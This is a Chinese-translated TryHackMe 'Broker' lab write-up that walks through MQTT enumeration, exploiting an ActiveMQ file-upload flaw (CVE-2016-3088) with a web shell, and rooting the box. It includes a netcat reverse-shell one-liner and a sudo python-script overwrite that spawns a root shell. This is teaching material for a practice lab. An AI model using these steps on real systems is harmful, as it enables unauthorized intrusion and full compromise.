<html>
<head>
<title>TryHackMe | Broker Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe |经纪人报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-broker-writeup-fb75b30cf674?source=collection_archive---------0-----------------------#2021-03-12">https://infosecwriteups.com/tryhackme-broker-writeup-fb75b30cf674?source=collection_archive---------0-----------------------#2021-03-12</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/ddea535623486aa86dee2e866b469b3b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tjrAZiW-kyPi9Yu8Fo6VyQ.png"/></div></div></figure></div><div class="ab cl jy jz hu ka" role="separator"><span class="kb bw bk kc kd ke"/><span class="kb bw bk kc kd ke"/><span class="kb bw bk kc kd"/></div><div class="ij ik il im in"><h1 id="ddf5" class="kf kg iq bd kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc bi translated"><strong class="ak">概述</strong></h1><p id="3a5b" class="pw-post-body-paragraph ld le iq lf b lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma ij bi translated">嘿，你们好吗？我带着另一篇报道回来了，这次是尝试由<a class="ae mb" href="https://tryhackme.com/p/M0N573R777" rel="noopener ugc nofollow" target="_blank"> M0N573R777 </a>和<a class="ae mb" href="https://tryhackme.com/p/ripcurlz" rel="noopener ugc nofollow" target="_blank"> ripcurlz </a>的<a class="ae mb" href="https://tryhackme.com/room/broker" rel="noopener ugc nofollow" target="_blank">经纪人</a>。这是一个非常有趣的盒子，也是一个非常独特的盒子，展示了物联网设备中非常微小的安全性。该机器首先扫描较高的端口，以获得在这些端口上运行的服务。其中一个端口托管一个MQTT代理，使用它我们可以找到一个主题进行订阅。然后，我们找到一个CVE，稍微修改一下，在机器上得到命令注入，并得到一个反向外壳返回。最后，我们使用一个错误配置的脚本来获得根用户访问权限。那么，没有别的话要说了，我们开始吧。</p><h1 id="f43c" class="kf kg iq bd kh ki mc kk kl km md ko kp kq me ks kt ku mf kw kx ky mg la lb lc bi translated"><strong class="ak">等待，然后继续！</strong></h1><p id="61d8" class="pw-post-body-paragraph ld le iq lf b lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma ij bi translated">在你继续这个房间之前，有一些事情你必须知道和理解。</p><p id="d454" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated"><em class="mm">什么是MQTT？</em></p><p id="3d4b" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">MQ遥测传输协议(MQTT)是一种主要由温度计等工业物联网设备使用的协议。虽然，有些例外确实存在，比如智能家居自动化系统。</p><p id="4eaa" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated"><em class="mm">MQTT为什么存在？</em></p><p id="ecdd" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">每个人(至少，每个阅读这篇文章的人)都知道互联网是基于TCP/IP模型的。但是，TCP/IP模型的主要问题是，它并没有被优化为适用于不稳定的低带宽网络。此外，使用受限制的设备(如传感器)时，数据处理能力已经非常低，TCP/IP网络堆栈很快成为一个问题。这就是MQTT的用武之地，它位于TCP/IP协议之上，并使用发布/订阅消息传递协议，该协议是专门针对不稳定、不可靠的低带宽连接而设计的，由于它使用TCP进行传输，因此它具有持续的会话感知能力。</p><p id="6e42" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated"><em class="mm">什么是发布/订阅消息协议？</em></p><p id="8c05" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">与TCP/IP使用的传统客户机-服务器模型(客户机直接与端点(另一个客户机或服务器)通信)不同，MQTT客户机分为两组:发送者(在MQTT中称为发布者)和接收数据的消费者(MQTT订户)。发布者和订阅者对彼此一无所知，事实上，他们从来没有直接联系过。第三个组件(MQTT代理)充当“中间人”，将消息从发布者引导到充当订阅者的任何端点。(哎呀)</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mn"><img src="../Images/d075e6d4d0c4c92857c5ea2d63facbaa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*lY1gvBSWViXDDy2m.jpg"/></div></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated">演职员表:<a class="ae mb" href="https://behrtech.com/blog/mqtt-in-the-iot-architecture/" rel="noopener ugc nofollow" target="_blank">https://behrtech.com/blog/mqtt-in-the-iot-architecture/</a></figcaption></figure><p id="054b" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">如果你想更多地了解MQTT是什么，以及它是如何工作的，请访问http://www.steves-internet-guide.com/mqtt-basics-course/。</p><p id="ca3e" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">好吧！，说完就走了。</p><h1 id="d2c8" class="kf kg iq bd kh ki mc kk kl km md ko kp kq me ks kt ku mf kw kx ky mg la lb lc bi translated"><strong class="ak">我们闯进去吧！</strong></h1><p id="e2b8" class="pw-post-body-paragraph ld le iq lf b lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma ij bi translated">和往常一样，从NMap扫描开始</p><pre class="mo mp mq mr gt mw mx my mz aw na bi"><span id="dc7b" class="nb kg iq mx b gy nc nd l ne nf">sudo nmap -sS -sC -sV -oA nmap/broker -vv *THM Box IP*</span></pre><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ng"><img src="../Images/e035a8e130bbde6ac1357b6a1752dedb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*y0quVntwWHUg6zF3LeO4rg.png"/></div></div></figure><p id="0cfe" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">NMap显示两个端口是开放的1883(MQTT)，8161(ActiveMQ)。</p><p id="20a5" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">端口8161托管一个由Apache软件基金会ActiveMQ开发的消息代理。点击“管理ActiveMQ代理”会弹出一个对话框，要求提供凭证。尝试一些默认密码，让我们以管理员身份登录。</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ng"><img src="../Images/afc6d12b0ce5442734c1e9be907cf000.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DyuT3SG_HVeJdNLzaheJBQ.png"/></div></div></figure><p id="e999" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">下一个任务需要使用MQTT客户机来访问通过的信息。要访问它，需要一些东西。首先，一个MQTT客户机连接到MQTT服务，然后是一个“主题”，我们将<em class="mm">作为订阅者</em>，接收由<em class="mm">发布者</em>发送的数据。</p><p id="8655" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">让我们检查一下代理的主题列表，因为我们没有任何主题。在访问代理的“主题”部分时，会出现多个主题，“secret_chat”是其中之一。有意思。</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nh"><img src="../Images/5cd428a133caa4d74f5fb319fdad7f27.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OSyqIaWVXwvvvpW1ohMtaA.png"/></div></div></figure><p id="65f5" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">要订阅该主题，首先安装您选择的MQTT客户机。由Eclipse基金会开发的Eclipse Mosquitto 有一个名为mosquitto_sub的工具，可以让你成为它的订阅者。</p><p id="76f2" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">现在，要订阅该主题，请使用以下命令</p><pre class="mo mp mq mr gt mw mx my mz aw na bi"><span id="ce24" class="nb kg iq mx b gy nc nd l ne nf">mosquitto_sub -t 'secret_chat/#' -h *THM Box IP* -p 1883 -V mqttv31 --tls-version tlsv1.2</span></pre><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ng"><img src="../Images/e686d08b7ab05124241ae027ef42cc97.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0EtqMGlzu3Pcd3Avf67Otw.png"/></div></div></figure><blockquote class="ni nj nk"><p id="6698" class="ld le mm lf b lg mh li lj lk mi lm ln nl mj lq lr nm mk lu lv nn ml ly lz ma ij bi translated">这里，-t:要订阅的主题，#:是一个通配符，允许您订阅多个级别的主题，-h:主机名或ip地址，-p:MQTT服务的端口号，-V:MQTT服务的版本，- tls-version:它是服务使用的tls版本</p></blockquote><p id="2ee7" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated"><strong class="lf ir">p . s .</strong>MQTT中的主题存储为目录，这就是为什么存在“#”和“+”通配符。</p><p id="9102" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">看起来，两个人正在使用代理作为聊天服务。看他们的聊天记录，他们似乎在讨论一个游戏。这是一种有趣的使用服务的方式，虽然不太安全。</p><p id="5a61" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">现在，为了获得机器访问权，我们需要为ActiveMQ开发一个CVE。搜索<a class="ae mb" href="https://www.exploit-db.com/" rel="noopener ugc nofollow" target="_blank"> exploit-db </a>，发现一个漏洞。但是，它并不像宣传的那样有效，需要做一些改变。</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ng"><img src="../Images/a28ab0ee17a02282c775d72d3163aa17.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jidkcMA0G9LKV_WO1j6V4g.png"/></div></div></figure><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ng"><img src="../Images/af1a0be456776e43604f07fe7a685bdc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kjt84g-7NWO463dZKrkzJw.png"/></div></div></figure><p id="aeb0" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">使用PUT HTTP谓词，并将有效负载发送到存储在文件服务器目录中。这个漏洞没有起作用，因为我们的web-shell没有在文件服务器目录中执行的权限。下一个合乎逻辑的事情是将它移动到一个可以移动的目录中。接下来的问题是，在哪里？</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nh"><img src="../Images/56d5c6224c602973e0cc3a2648bed70c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DI8L6IGhgM7UZaWapdH86g.png"/></div></div></figure><p id="9c0d" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">在搜索漏洞的可用解决方案时，我看到了由<a class="ae mb" href="https://medium.com/@knownsec404team/analysis-of-apache-activemq-remote-code-execution-vulnerability-cve-2016-3088-575f80924f30" rel="noopener"> Knownsec 404 </a>团队撰写的这篇伟大的文章，这篇文章更深入地解释了漏洞，为什么它不起作用，以及如何使它起作用。</p><p id="ebab" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">Knownsec 404团队似乎将它移到了一个名为“Apache-ActiveMQ-<em class="mm">some version number</em>”的目录中。下一个障碍是计算代理的版本号。NMap没有给我们提供，所以我们需要手动搜索。使用GoBuster，让我们尝试找到一些端点。</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ng"><img src="../Images/2a08b942ba7f5d81ca889406323978de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ha-5vVKZLaVwXG_3U8Lz4w.png"/></div></div></figure><p id="5258" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">在发出请求时，记得放入“Authorization”头，否则应用程序将只响应401(未授权)代码。我们有许多结果，在访问第一个目录时，我们找到了版本号，完整的路径反映在网页上。</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ng"><img src="../Images/e27be65f23d2b205536eb4cc5bbb5fe7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7ffSu1jBYGI_-JM-55FQDA.png"/></div></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated">关注activemq.home</figcaption></figure><p id="d6a5" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">现在，我们可以绝对肯定这是我们应该移动外壳的路径，以便执行它。让我们利用MOVE方法，并指定目标路径(在activemq.home/webapps/admin中)，来移动我们的web-shell。</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ng"><img src="../Images/aa74ae6c792ab542775d0248a56f370d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BgKQYVeLwakr74auTU9uZQ.png"/></div></div></figure><p id="56f6" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">然后，去“*THM box IP*/admin/cmd.jsp？cmd= "并向cmd变量传递您希望在机器上执行的任何值。</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ng"><img src="../Images/0233b4e5c0f06b8ef293a1977ce11a27.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*v7CnuH3Ehf4nwikb43Xb2g.png"/></div></div></figure><p id="8f99" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">我们得到了命令执行，这意味着我们可以得到我们机器的反向外壳。使用普通的bash reverse shell one liner，我无法得到一个反向shell，可能是一些坏字符，打乱了命令，所以我使用NetCat reverse shell oneliner。</p><pre class="mo mp mq mr gt mw mx my mz aw na bi"><span id="9788" class="nb kg iq mx b gy nc nd l ne nf">nc -e /bin/bash *Your tun0 IP* *port you’re listening on*</span></pre><p id="46af" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">记住用“+”符号或使用“%20”对空格进行编码，否则该命令将不起作用。</p><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ng"><img src="../Images/f4142ae34159a1f013b18efb22b47087.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Voz08q1d6C3y_N4v9stI1g.png"/></div></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated">升级反向外壳</figcaption></figure><p id="ac1a" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">反向外壳是作为机器上的用户接收的。运行sudo -l时，用户activemq可以作为根用户运行一个python脚本，该脚本归activemq所有。这意味着，改变文件的内容，并执行它，将得到根外壳。用以下命令更改脚本的内容</p><pre class="mo mp mq mr gt mw mx my mz aw na bi"><span id="34cc" class="nb kg iq mx b gy nc nd l ne nf">import os<br/>os.system(“/bin/bash”)</span></pre><figure class="mo mp mq mr gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ng"><img src="../Images/a4028149d197a94742ecb85539f47eb2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lKJalkGH7WB8zHTv-fYpDQ.png"/></div></div></figure><p id="73b4" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">这就是装箱子的人。希望你们喜欢</p><p id="dc3d" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">如果你有任何建议，请在评论中告诉我。</p><p id="2285" class="pw-post-body-paragraph ld le iq lf b lg mh li lj lk mi lm ln lo mj lq lr ls mk lu lv lw ml ly lz ma ij bi translated">祝你有美好的一天！</p></div></div>    
</body>
</html>